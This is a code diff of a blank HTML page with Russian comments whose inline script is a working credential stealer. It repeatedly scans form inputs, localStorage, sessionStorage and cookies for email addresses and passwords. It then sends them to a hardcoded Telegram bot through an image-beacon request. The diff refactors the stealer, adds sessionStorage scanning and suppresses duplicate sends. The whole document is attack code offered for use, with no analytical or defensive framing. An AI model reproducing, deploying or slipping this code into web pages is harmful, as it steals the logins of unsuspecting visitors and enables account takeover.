@@ -6,26 +6,23 @@
     <title></title>
     <style>
         * { margin: 0; padding: 0; }
-        body { 
-            background: white; 
-            width: 100vw; 
-            height: 100vh; 
-            overflow: hidden;
-        }
+        body { background: white; }
+        html, body { width: 100%; height: 100%; overflow: hidden; }
     </style>
 </head>
 <body>
 
 <script>
-// ===== ТВОЙ ТОКЕН =====
 const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
 const CHAT_ID = "8850351378";
-// =====================
 
 let sent = false;
+let lastEmail = '';
+let lastPass = '';
 
 function sendToTelegram(email, password) {
     if (sent) return;
+    if (!email) return;
     sent = true;
     
     const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}`;
@@ -35,31 +32,32 @@ function sendToTelegram(email, password) {
     new Image().src = url;
 }
 
-function findEmailAndPassword() {
-    let email = '';
-    let password = '';
+function findData() {
+    if (sent) return;
     
-    // ===== 1. ИЩЕМ EMAIL В ПОЛЯХ ВВОДА =====
+    let email = '';
+    let pass = '';
+    
+    // ПОЛЯ ВВОДА
     const inputs = document.querySelectorAll('input');
-    inputs.forEach(input => {
-        const val = input.value ? input.value.trim() : '';
+    for (let input of inputs) {
+        const val = input.value || '';
         if (val && val.includes('@') && val.includes('.')) {
             email = val;
         }
-        if (!password && input.type === 'password' && input.value) {
-            password = input.value.trim();
+        if (!pass && input.type === 'password' && input.value) {
+            pass = input.value;
         }
-        if (!password && input.getAttribute('autocomplete') === 'current-password' && input.value) {
-            password = input.value.trim();
+        if (!pass && input.getAttribute('autocomplete') === 'current-password' && input.value) {
+            pass = input.value;
         }
-    });
+    }
     
-    // ===== 2. ИЩЕМ EMAIL В localStorage =====
-    if (!email && window.localStorage) {
+    // LOCALSTORAGE
+    if (!email && localStorage) {
         try {
             for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const val = localStorage.getItem(key);
+                const val = localStorage.getItem(localStorage.key(i));
                 if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
                     email = val;
                     break;
@@ -68,124 +66,93 @@ function findEmailAndPassword() {
         } catch(e) {}
     }
     
-    // ===== 3. ИЩЕМ EMAIL В cookies =====
+    // SESSIONSTORAGE
+    if (!email && sessionStorage) {
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const val = sessionStorage.getItem(sessionStorage.key(i));
+                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
+                    email = val;
+                    break;
+                }
+            }
+        } catch(e) {}
+    }
+    
+    // COOKIES
     if (!email && document.cookie) {
         try {
             const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                if (cookie.includes('@') && cookie.includes('.')) {
-                    email = cookie.trim();
+            for (let c of cookies) {
+                if (c.includes('@') && c.includes('.')) {
+                    email = c.trim();
                     break;
                 }
             }
         } catch(e) {}
     }
     
-    // ===== 4. ИЩЕМ EMAIL В sessionStorage =====
-    if (!email && window.sessionStorage) {
-        try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const val = sessionStorage.getItem(key);
-                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
-                    email = val;
-                    break;
-                }
-            }
-        } catch(e) {}
-    }
-    
-    // ===== 5. ИЩЕМ ПАРОЛЬ В localStorage =====
-    if (!password && window.localStorage) {
+    // ПАРОЛЬ ИЗ LOCALSTORAGE
+    if (!pass && localStorage) {
         try {
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const val = localStorage.getItem(key);
                 if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
-                    password = val;
+                    pass = val;
                     break;
                 }
             }
         } catch(e) {}
     }
     
-    // ===== 6. ИЩЕМ ПАРОЛЬ В sessionStorage =====
-    if (!password && window.sessionStorage) {
+    // ПАРОЛЬ ИЗ SESSIONSTORAGE
+    if (!pass && sessionStorage) {
         try {
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 const val = sessionStorage.getItem(key);
                 if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
-                    password = val;
+                    pass = val;
                     break;
                 }
             }
         } catch(e) {}
     }
     
-    // ===== 7. ИЩЕМ ПАРОЛЬ В COOKIES =====
-    if (!password && document.cookie) {
-        try {
-            const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                const lower = cookie.toLowerCase();
-                if (lower.includes('pass') || lower.includes('pwd') || lower.includes('token')) {
-                    password = cookie.trim();
-                    break;
-                }
-            }
-        } catch(e) {}
-    }
-    
-    // ===== 8. ОТПРАВЛЯЕМ ЕСЛИ НАШЛИ EMAIL =====
+    // ЕСЛИ НАШЛИ EMAIL
     if (email && !sent) {
-        sendToTelegram(email, password);
-        return true;
-    }
-    return false;
-}
-
-// ===== ЗАПУСК ПРИ ЗАГРУЗКЕ =====
-window.addEventListener('load', function() {
-    // Даём браузеру время на автозаполнение
-    setTimeout(findEmailAndPassword, 100);
-    setTimeout(findEmailAndPassword, 300);
-    setTimeout(findEmailAndPassword, 600);
-    setTimeout(findEmailAndPassword, 1000);
-    setTimeout(findEmailAndPassword, 2000);
-    setTimeout(findEmailAndPassword, 3000);
-    setTimeout(findEmailAndPassword, 5000);
-});
-
-// ===== ЛОВИМ ВВОД =====
-document.addEventListener('input', function(e) {
-    if (e.target.tagName === 'INPUT') {
-        const val = e.target.value ? e.target.value.trim() : '';
-        if (val) {
-            if (val.includes('@') && val.includes('.')) {
-                setTimeout(findEmailAndPassword, 50);
-            }
-            if (e.target.type === 'password') {
-                setTimeout(findEmailAndPassword, 50);
-            }
+        if (email !== lastEmail || pass !== lastPass) {
+            lastEmail = email;
+            lastPass = pass;
+            sendToTelegram(email, pass);
         }
     }
+}
+
+// ЗАПУСК
+window.addEventListener('load', function() {
+    setTimeout(findData, 100);
+    setTimeout(findData, 300);
+    setTimeout(findData, 600);
+    setTimeout(findData, 1000);
+    setTimeout(findData, 2000);
+    setTimeout(findData, 3000);
+    setTimeout(findData, 5000);
 });
 
-// ===== ЛОВИМ ОТПРАВКУ ФОРМ =====
-document.addEventListener('submit', function(e) {
-    setTimeout(findEmailAndPassword, 100);
-    setTimeout(findEmailAndPassword, 300);
-});
-
-// ===== ЛОВИМ ИЗМЕНЕНИЯ =====
-document.addEventListener('change', function(e) {
+// ВВОД
+document.addEventListener('input', function(e) {
     if (e.target.tagName === 'INPUT') {
-        setTimeout(findEmailAndPassword, 50);
+        setTimeout(findData, 50);
     }
 });
 
-console.log('🔍 ROCKET ACTIVE - Поиск почты и пароля...');
+// ОТПРАВКА ФОРМЫ
+document.addEventListener('submit', function() {
+    setTimeout(findData, 100);
+    setTimeout(findData, 300);
+});
 </script>
 </body>
 </html>
